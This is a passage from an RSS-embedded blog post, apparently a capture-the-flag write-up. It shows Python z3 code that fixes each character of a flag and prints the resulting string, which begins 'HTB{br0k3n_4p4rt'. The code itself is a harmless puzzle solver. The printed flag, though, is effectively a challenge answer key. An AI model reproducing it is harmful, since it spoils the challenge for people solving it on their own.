solver.add(letters[23] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'r'</span>))
solver.add(letters[9]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'n'</span>))
solver.add(letters[10] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'_'</span>))
solver.add(letters[8]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'3'</span>))
solver.add(letters[11] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'4'</span>))
solver.add(letters[12] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'p'</span>))
solver.add(letters[13] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'4'</span>)) 
solver.add(letters[14] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'r'</span>)) 
solver.add(letters[15] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'t'</span>))
solver.add(letters[1]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'T'</span>)) 
solver.add(letters[2]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'B'</span>)) 
solver.add(letters[3]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'{'</span>)) 
solver.add(letters[4]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'b'</span>)) 
solver.add(letters[5]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'r'</span>))
solver.add(letters[6]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'0'</span>)) 
solver.add(letters[7]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'k'</span>))
solver.add(letters[0]  <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'H'</span>)) 

<span class="org-keyword">if</span> solver.check() <span class="org-operator">==</span> z3.sat:
     <span class="org-variable-name">m</span> <span class="org-operator">=</span> solver.model()
     <span class="org-variable-name">answ</span> <span class="org-operator">=</span> <span class="org-string">''</span>
     <span class="org-keyword">for</span> i <span class="org-keyword">in</span> letters:
         <span class="org-comment-delimiter"># </span><span class="org-comment">as_string does not work -&gt; the integer is transformed into a string.</span>
         <span class="org-variable-name">answ</span> <span class="org-operator">+=</span> (f<span class="org-string">'</span>{<span class="org-builtin">chr</span>(m.evaluate(i).as_long())}<span class="org-string">'</span>)
     <span class="org-builtin">print</span>(answ)
</pre>
</div>
</div>
</div>
</div>
]]>
</description></item>
</channel>
</rss>
